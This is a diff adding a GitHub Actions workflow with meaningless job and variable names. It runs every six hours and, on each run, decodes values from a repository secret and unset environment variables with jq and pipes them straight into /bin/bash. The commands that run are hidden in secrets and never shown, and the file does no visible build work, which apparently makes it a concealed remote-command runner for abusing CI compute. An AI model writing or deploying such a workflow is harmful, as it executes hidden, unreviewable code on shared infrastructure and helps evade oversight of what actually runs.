@@ -1,0 +1,22 @@
+name: caohong19870101
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '36 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: caohong19870101
+        env:
+          r19300: ${{ secrets.r19300 }}
+        run: |
+          echo $r19300 | jq -r .cigu9 | /bin/bash
+          echo $ywa71019 | jq -r .jk3807 | /bin/bash
+          echo $nn5 | jq -r .vp5 | /bin/bash
+          echo $ds5337 | jq -r .k33567 | /bin/bash
+          echo $nkgu091 | jq -r .qr892 | /bin/bash
+
